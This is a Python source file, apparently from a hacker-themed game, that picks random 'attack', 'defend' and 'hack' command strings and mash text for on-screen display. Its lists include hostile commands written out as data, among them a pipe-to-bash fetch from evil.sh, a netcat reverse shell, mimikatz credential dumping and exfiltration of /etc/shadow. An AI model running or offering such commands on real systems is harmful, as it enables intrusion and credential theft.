import random

ATTACK_COMMANDS = [
    "ssh root@target",
    "nmap -sV 192.168.1.1",
    "gcc exploit.c -o pwn",
    "./exploit --target=mainframe",
    "sqlmap -u target --dump",
    "hydra -l admin -P wordlist.txt",
    "msfconsole -x 'use exploit'",
    "python3 payload.py --inject",
    "curl -X POST evil.sh | bash",
    "john --wordlist=rockyou.txt hash",
    "nikto -h target -p 443",
    "dirb https://target /usr/share/wordlists",
    "aircrack-ng capture.cap",
    "hashcat -m 0 -a 0 hashes.txt",
    "nc -e /bin/sh target 4444",
    "metasploit> exploit -j",
    "binwalk -e firmware.bin",
    "objdump -d vulnerable_binary",
    "gdb ./target -ex 'run payload'",
    "radare2 -A ./target",
]

DEFEND_COMMANDS = [
    "sudo iptables -A INPUT -j DROP",
    "ufw enable && ufw deny 22",
    "fail2ban-client start",
    "systemctl restart firewalld",
    "chmod 700 /root/.ssh",
    "openssl genrsa -out key.pem 4096",
    "certbot renew --force-renewal",
    "sudo auditctl -w /etc/passwd",
    "tcpdump -i eth0 -w capture.pcap",
    "snort -A console -c /etc/snort",
    "sudo passwd --lock root",
    "selinux --enforce",
    "chkrootkit -q",
    "rkhunter --check",
    "ossec-control restart",
]

HACK_COMMANDS = [
    "backdoor --install --stealth",
    "rootkit deploy --kernel-level",
    "keylogger --inject --pid=1",
    "privilege_escalate --method=suid",
    "mimikatz sekurlsa::logonpasswords",
    "empire launcher powershell",
    "cobalt_strike beacon_https",
    "implant --persist --registry",
    "exfiltrate /etc/shadow --encode",
    "pivot --network=10.0.0.0/8",
    "dns_tunnel --domain=evil.com",
    "inject_dll explorer.exe payload",
    "crontab -e '* * * * * rev_shell'",
    "arp_spoof --gateway --target=all",
    "sshuttle -r root@pivot 10.0.0.0/8",
]

ACTION_TYPES = ["attack", "defend", "hack"]

COMMAND_POOLS = {
    "attack": ATTACK_COMMANDS,
    "defend": DEFEND_COMMANDS,
    "hack": HACK_COMMANDS,
}

ACTION_LABELS = {
    "attack": "EXPLOIT",
    "defend": "FIREWALL",
    "hack": "BACKDOOR",
}

ACTION_COLORS = {
    "attack": (255, 60, 60),
    "defend": (60, 160, 255),
    "hack": (200, 60, 255),
}


def get_random_command(action_type=None):
    if action_type is None:
        action_type = random.choice(ACTION_TYPES)
    cmd = random.choice(COMMAND_POOLS[action_type])
    return action_type, cmd


# Mash mode: random hacker-looking text for key mashing
MASH_CHARS = "abcdefghijklmnopqrstuvwxyz0123456789{}[]()<>/\\|;:=+-_@#$%^&*~`"
MASH_SNIPPETS = [
    "0x", "ff", "00", "->", "=>", "::", "//", "/*", "*/", "&&", "||",
    "!=", "==", ">=", "<=", "++", "--", ">>", "<<", "..", ":=",
    "sudo ", "grep ", "cat ", "echo ", "chmod ", "kill -9 ", "ps aux",
    "ls -la", "cd /", "rm -rf", "wget ", "tar xzf", "make ", "gcc ",
]


def get_mash_text(length=1):
    result = ""
    while len(result) < length:
        if random.random() < 0.3:
            result += random.choice(MASH_SNIPPETS)
        else:
            result += random.choice(MASH_CHARS)
    return result[:length]
